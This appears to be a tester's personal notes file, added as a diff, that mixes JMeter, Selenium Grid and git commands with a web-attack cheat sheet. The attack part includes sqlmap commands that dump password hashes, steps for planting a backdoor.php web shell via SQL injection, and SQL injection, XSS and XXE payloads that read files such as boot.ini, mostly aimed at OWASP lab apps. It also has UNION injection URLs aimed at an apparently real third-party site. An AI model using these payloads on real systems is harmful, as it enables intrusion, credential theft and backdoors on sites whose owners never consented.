@@ -1,0 +1,204 @@
+SQL Mapping- Kali Linux
+Copy raw code from brup suite and save as .txt file.
+open kali sql mapping
+# sqlmap --purge -output (clear previous codes)
+#sqlmap -r ~/Documents/sql.txt/
+#sqlmap -r ~/Documents/sql.txt --technique B -p username --current-user
+#sqlmap -r ~/Documents/sql.txt --technique B -p username  -U root@localhost --passwords(shows password in hash)
+
+= Upload Web shell via SQL injection
+use hints from sql and use union code in username and forward it will create backdoor.php page
+use that page in url and it will show command enter box. Add null till error page doesnot appear.
+
+type dir 
+type D:\xampp\htdocs\owasp\index.php
+
+ Part 4 - Auth Bypass via SQLi & Cookie Tampering
+username= yangjee' -- 
+' or 1='1 --
+
+-- Jmeter report--
+Create html reports from command line :
+Go to jmeter bin folder 
+jmeter -n -t C:\Users\Acer\Desktop\apache-jmeter-3.2\bin\examples\htmlreporting.jmx -l C:\Users\Acer\Desktop\apache-jmeter-3.2\bin\examples\html.csv -e -o C:\Users\Acer\Desktop\apache-jmeter-3.2\bin\examples\htmlreports
+
+Jenkins:
+cd C:\Users\Acer\Desktop\apache-jmeter-4.0\bin
+
+jmeter -Jjmeter.save.saveservice.output_format=xml -n -t C:\Users\Acer\Desktop\apache-jmeter-4.0\bin\apitest.jmx -l C:\Users\Acer\Desktop\apache-jmeter-4.0\bin\apitest.jtl
+
+
+#selenium grid hub 
+java -jar C:\Users\Acer\Desktop\selenium\selenium-server-standalone-3.5.3.jar  -role hub -port 4447
+
+java -Dwebdriver.chrome.driver=C:\Users\Acer\Desktop\selenium\new_driver\chromedriver.exe -jar  C:\Users\Acer\Desktop\selenium\selenium-server-standalone-2.48.2.jar -role node -hub http://localhost:4447/grid/register
+
+java -jar  C:\Users\Acer\Desktop\selenium\selenium-server-standalone-2.48.2.jar -role webdriver -hub http://192.168.0.111:4447/grid/register/ -port 4448  //other virtual system
+
+java -Dwebdriver.chrome.driver=C:\Users\Acer\Desktop\selenium\new_driver\chromedriver.exe -jar  C:\Users\Acer\Desktop\selenium\selenium-server-standalone-3.5.3.jar -role node -hub http://192.168.0.111:4447/grid/register/ -port 4449
+
+java -Dwebdriver.ie.driver=C:\Users\Acer\Desktop\selenium\new_driver\IEDriverServer.exe -jar  C:\Users\Acer\Desktop\selenium\selenium-server-standalone-3.5.3.jar -role node -hub http://192.168.0.111:4447/grid/register/ -port 4450
+
+appium --address 127.0.0.1 --port 5001 -bp 8190 --nodeconfig 
+ C:\Selenium\grid-mobile-work\node-Selenium-samsung6.json  --session-override & 
+
+Create json file for devices C:\Selenium\grid-mobile-work\node-Selenium-s6edge.json 
+Set ip in different appium advanced setting for devices.
+
+
+sqlplushttps://github
++com/YangjeeR/repo2
+
+PLSQL oracle
+C:\Users\Acer>sqlplus "/ as sysdba"
+
+string.valueof(var) to convert  int to string
+
+https://app.pluralsight.com/library/courses/web-security-owasp-top10-big-picture/table-of-contents
+
+virtualbox
+https://www.owasp.org/index.php/OWASP_Broken_Web_Applications_Project
+https://sourceforge.net/projects/owaspbwa/files/
+
+
+
+
+SQL Injection:
+
+' or a ='a
+and firstname<>'Mickey'
+
+bank union (select table_name,table_schema,3 from information_schema.tables);
+
+: bank' and 1=sleep(2);
+SQL injection
+
+'1' or '1'='1'
+
+' OR 1='1
+
+bank union (select 1,2,3 from dual);
+
+union(select column_name,2,3 from information_schema.columns where table_name='users');
+
+union(select ulogin,uhash,utype from users);
+
+
+
+url for viewing tables:
+http : / / w w w . pkmotors.com/ads _ detail.php?nAddsID=-21759%20union%20all%20select%201,2,3,4,5,6,version%28%29,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,group_concat%28table_name%29,37,38,39,40,41,42,43%20from%20information_schema.tables%20where%20table_schema=database%28%29--
+
+url for viewing columns:
+http : / / w w w . pkmotors.com/ads _ detail.php?nAddsID=-21759%20union%20all%20select%201,2,3,4,5,6,version%28%29,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,group_concat%28column_name%29,37,38,39,40,41,42,43%20from%20information_schema.columns%20where%20table_schema=database%28%29--
+
+
+Owasp Mutillidae:
+User/login
+' or 1='1 need space in end
+---------------------------------------------------------
+Javascript injection
+%22%3b}catch(e){}%3balert(0)%3btry{a%3d%22%
+
+GET /owasp/index.php?page=password-generator.php&username=";}catch(e){};alert(0);try{a="
+
+Url:
+http://127.0.0.1/owasp/index.php?page=password-generator.php&username=%22%3b}catch(e){}%3balert(0)%3btry{a%3d%22%
+
+
+try{
+		document.getElementById("idUsernameInput").innerHTML = "This password is for ";}catch(e){};alert(0);try{a="";
+	}catch(e){
+		alert("Error: " + e.message);
+	}// end catch
+--------------------------------------
+Username Enumeration
+ login using wrong username and correct password
+run reapter and check username and click go then click compare
+again login using correct username and correct password
+run reapter and check username and click go then click compare
+check difference between these two scripts
+check AuthenticationAttemptResultFlag = 1 for correct and AuthenticationAttemptResultFlag = 0 for incorrect username
+click on intruder .give start position 
+payloads add all correct and incorrect usernames
+
+options=>
+grep -Extract again search for AuthenticationAttemptResultFlag = 1 and add it
+start attack
+
+XSS
+- <script>alert(document.cookie);</script>
+
+Stylesheet injection:
+page-to-frame=styling.php/foo/bar/{ }*{color:blue}//
+
+XML validator:
+<?xml version="1.0"?>
+<!DOCTYPE change-log [
+<!ENTITY systemEntity SYSTEM "robots.txt">]>
+<change-log><text>&systemEntity;</text>;
+</change-log>
+
+<?xml version="1.0"?>
+<!DOCTYPE change-log [
+<!ENTITY systemEntity SYSTEM "../../../boot.ini">]>
+<change-log><text>&systemEntity;</text>;
+</change-log>
+
+Timing:
+' union select 
+----------------------------------------
+%27+union+select+null, null, null,  sleep(10)+--+
+
+--------------------------
+username= ' union select null,null,null --
+
+%27+union+select+null%2CLOAD_FILE('mysql_error_log')+--+
+
+LOAD_FILE('..\\...\\..\\..\\..\\boot.ini')
+
+
+Installation softwrare for Appium:
+Java 
+Eclipse
+Selenium Jars
+Java-client
+Appium Server
+NodeJ SZ
+Android SDK
+Microsoft.net
+GenyMotion(OPT)-smulators/virtual device
+APK file
+Device
+PADnet
+
+owsap zap
+Brup Suite
+
+-- GIT---
+
+$git config --global user.email "your@"
+
+$ git remote add origin https://github.com/YangjeeR/repo2.git
+
+$ git push -u origin master
+git init
+git add
+git commit -m"message"
+git --help
+git log
+git .add (all files)
+git status
+create file
+dir>file name
+touch filename
+
+//selenium with jenkins 
+Create test and testng.xml in project 
+
+cd D:\eclipse-workspace\myproject
+D:\eclipse-workspace\myproject>set classpath=D:\eclipse-workspace\myproject\bin;D:\eclipse-workspace\myproject\lib\*;
+
+D:\eclipse-workspace\myproject>java org.testng.TestNG testng.xml;
+
+create bat file
+java -cp bin;lib/* org.testng.TestNG testng.xml  //save as bat file in project folder
